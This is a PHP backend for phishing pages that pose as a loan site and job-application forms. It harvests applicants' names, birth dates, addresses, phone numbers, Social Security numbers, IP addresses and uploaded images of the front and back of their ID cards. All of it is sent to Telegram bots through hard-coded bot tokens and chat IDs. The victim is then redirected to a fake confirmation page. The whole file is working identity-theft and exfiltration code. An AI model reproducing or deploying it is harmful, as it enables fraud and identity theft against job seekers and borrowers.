<?php
// 🚨 ADD THESE LINES AT THE TOP - Memory and timeout fixes
ini_set('upload_max_filesize', '10M');
ini_set('post_max_size', '12M');
ini_set('max_execution_time', 120);
ini_set('max_input_time', 120);
ini_set('memory_limit', '256M');

ob_start(); // Start output buffering to prevent headers already sent

// include 'firewall.php';

// 🌐 Site map: define how each site should behave
$site_map = [
    "upstartloan.rf.gd" => [
        "bots" => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ["token" => "7683707216:AAFKB6Izdj c-M2mIaR_vRf-9Ha7CkEh7rA", "chat_id" => "7510889526"],
        ],
        "redirect" => "https://upstartloan.rf.gd/cache_site/thankyou.html"
        
    ],


    'paysphere.42web.io' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],

            ['token' => '8327467242:AAFFBheM0nU1-45BKH5vAvdfXKhgXPopJvg', 'chat_id' => '7919111838']
        ],
        'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/processing.html'
    ],
    

    // Add more sites...
];

// 🧠 Determine origin domain (not PHP host)
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';
$config = $site_map[$domain] ?? null;

if (!$config) {
    http_response_code(403);
    exit("Access denied: Unauthorized site ($domain).");
}

// 🚀 Handle POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 📝 Log file
    $log_file = __DIR__ . "/logs/job_applications.txt";
    if (!file_exists(dirname($log_file))) {
        mkdir(dirname($log_file), 0777, true);
    }

    function log_entry($msg) {
        global $log_file;
        file_put_contents($log_file, "[" . date("Y-m-d H:i:s") . "] $msg\n", FILE_APPEND);
    }

    // 📋 Get form fields
    $first = htmlspecialchars($_POST['q11_fullName']['first'] ?? '');
    $middle = htmlspecialchars($_POST['q11_fullName']['middle'] ?? '');
    $last = htmlspecialchars($_POST['q11_fullName']['last'] ?? '');
    $full_name = trim("$first $middle $last");

    $dob = sprintf("%04d-%02d-%02d", 
        $_POST['q18_birthDate']['year'] ?? 0, 
        $_POST['q18_birthDate']['month'] ?? 0, 
        $_POST['q18_birthDate']['day'] ?? 0);

    $address = htmlspecialchars(($_POST['q16_currentAddress']['addr_line1'] ?? '') . " " .
                                ($_POST['q16_currentAddress']['addr_line2'] ?? '') . ", " .
                                ($_POST['q16_currentAddress']['city'] ?? '') . ", " .
                                ($_POST['q16_currentAddress']['state'] ?? '') . ", " .
                                ($_POST['q16_currentAddress']['postal'] ?? ''));

    $email = htmlspecialchars($_POST['q12_emailAddress'] ?? '');
    $phone = htmlspecialchars($_POST['q13_phoneNumber13']['full'] ?? '');
    $position = htmlspecialchars($_POST['q14_positionApplied'] ?? '');
    $job_type = htmlspecialchars($_POST['q24_jobType'] ?? '');
    $source = htmlspecialchars($_POST['q21_howDid21'] ?? '');
    $ssn = htmlspecialchars($_POST['q25_socSec'] ?? '');
    
    // 🌐 FIXED: Get client IP address more reliably
    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_X_FORWARDED'] ?? 
          $_SERVER['HTTP_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_FORWARDED'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 
          'unknown';
    
    // Handle multiple IPs in X_FORWARDED_FOR
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }
    
    $timestamp = date("Y-m-d H:i:s");

    // 📦 FIXED: Enhanced upload handler with better file type support
    function uploadFile($key, $prefix) {
        $upload_dir = __DIR__ . "/uploads/";
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);

        // Check if files exist and are uploaded successfully
        if (!empty($_FILES[$key]['name'][0]) && $_FILES[$key]['error'][0] === UPLOAD_ERR_OK) {
            $original = $_FILES[$key]['name'][0];
            $ext = strtolower(pathinfo($original, PATHINFO_EXTENSION));
            $tmp_name = $_FILES[$key]['tmp_name'][0];
            
            // 🖼️ FIXED: Support for common image formats and documents
            $allowed_extensions = [
                // Common image formats
                'jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'ico',
                // Document formats
                'pdf', 'doc', 'docx', 'txt', 'rtf',
                // Archive formats
                'zip', 'rar', '7z'
            ];
            
            // Check if extension is allowed
            if (!in_array($ext, $allowed_extensions)) {
                log_entry("❌ File upload rejected - invalid extension: $ext for file $original");
                return null;
            }
            
            // Check MIME type for additional security
            $finfo = finfo_open(FILEINFO_MIME_TYPE);
            $mime_type = finfo_file($finfo, $tmp_name);
            finfo_close($finfo);
            
            $allowed_mime_types = [
                // Images
                'image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/bmp', 'image/webp', 'image/svg+xml',
                // Documents
                'application/pdf', 'application/msword', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                'text/plain', 'application/rtf', 'text/rtf',
                // Archives
                'application/zip', 'application/x-rar-compressed', 'application/x-7z-compressed'
            ];
            
            if (!in_array($mime_type, $allowed_mime_types)) {
                log_entry("❌ File upload rejected - invalid MIME type: $mime_type for file $original");
                return null;
            }
            
            // Generate safe filename
            $safe_name = $prefix . "_" . time() . "_" . bin2hex(random_bytes(4)) . "." . $ext;
            $path = $upload_dir . $safe_name;

            if (move_uploaded_file($tmp_name, $path)) {
                log_entry("✅ File uploaded successfully: $safe_name");
                return $path;
            } else {
                log_entry("❌ File move failed: $original");
            }
        } else {
            $error_code = $_FILES[$key]['error'][0] ?? 'unknown';
            log_entry("❌ File upload error for $key: Code $error_code");
        }
        return null;
    }

    $front_id = uploadFile("q17_uploadYour", "front_id");
    
    // 🚨 ADD SMALL DELAY BETWEEN UPLOADS
    if (function_exists('usleep')) usleep(500000); // 0.5 second delay
    
    $back_id = uploadFile("q26_identityVerification", "back_id");

    // 🧾 Format Telegram message
    $message = "📝 *New Job Application*\n\n" .
               "👤 *Name:* $full_name\n" .
               "🎂 *DOB:* $dob\n" .
               "🏠 *Address:* $address\n" .
               "📧 *Email:* $email\n" .
               "📞 *Phone:* $phone\n" .
               "💼 *Position:* $position\n" .
               "📌 *Job Type:* $job_type\n" .
               "🗣 *Referred By:* $source\n" .
               "🔐 *SSN:* $ssn\n" .
               "🕒 *Submitted:* $timestamp\n" .
               "🌐 *IP:* $ip\n" .
               "📎 *ID Uploaded:* " . (($front_id || $back_id) ? "✅ Yes" : "❌ No");

    // 📬 Send text to bots
    foreach ($config['bots'] as $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) {
            continue; // Skip empty bot configurations
        }
        
        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
        $data = ['chat_id' => $bot['chat_id'], 'text' => $message, 'parse_mode' => 'Markdown'];

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_TIMEOUT => 30
        ]);
        $result = curl_exec($ch);
        if (curl_error($ch)) {
            log_entry("❌ Telegram message error: " . curl_error($ch));
        }
        curl_close($ch);
    }

    // 📤 FIXED: Enhanced file sending with better format support AND RETRY LOGIC
    function sendFile($file, $caption, $bots) {
        if (!$file || !is_string($file) || !file_exists($file)) return;
        
        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        
        // Determine if it's an image or document
        $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
        $is_image = in_array($ext, $image_extensions);
        
        foreach ($bots as $bot) {
            if (empty($bot['token']) || empty($bot['chat_id'])) {
                continue; // Skip empty bot configurations
            }
            
            $endpoint = $is_image ? "sendPhoto" : "sendDocument";
            $url = "https://api.telegram.org/bot{$bot['token']}/$endpoint";
            $payload = [
                'chat_id' => $bot['chat_id'],
                ($is_image ? 'photo' : 'document') => new CURLFile(realpath($file)),
                'caption' => $caption,
                'parse_mode' => 'Markdown'
            ];

            // 🚨 ADD RETRY LOGIC (2 attempts)
            $max_attempts = 2;
            $attempt = 1;
            
            while ($attempt <= $max_attempts) {
                $ch = curl_init($url);
                curl_setopt_array($ch, [
                    CURLOPT_POST => true, 
                    CURLOPT_POSTFIELDS => $payload, 
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_TIMEOUT => 60, // Longer timeout for file uploads
                    CURLOPT_HTTPHEADER => [
                        'Content-Type: multipart/form-data'
                    ]
                ]);
                
                $result = curl_exec($ch);
                $success = true;
                
                if (curl_error($ch)) {
                    log_entry("❌ Telegram file error (attempt $attempt): " . curl_error($ch));
                    $success = false;
                }
                
                curl_close($ch);
                
                if ($success) {
                    log_entry("✅ File sent successfully on attempt $attempt");
                    break; // Success, exit retry loop
                }
                
                $attempt++;
                if ($attempt <= $max_attempts) {
                    sleep(2); // Wait 2 seconds before retry
                }
            }
        }
    }

    // 🚨 ADD DELAYS BETWEEN FILE SENDS
    if ($front_id) {
        sendFile($front_id, "📎 *Front ID* for $full_name", $config['bots']);
        sleep(2); // 2 second delay between file sends
    }
    
    if ($back_id) {
        sendFile($back_id, "📎 *Back ID* for $full_name", $config['bots']);
        sleep(1); // 1 second delay after last file
    }

    log_entry("✅ [$domain] Job application received from $ip ($full_name)");

    ob_end_clean(); // Discard any unexpected output before redirect
    header("Location: " . $config['redirect']);
    exit;
}
?>
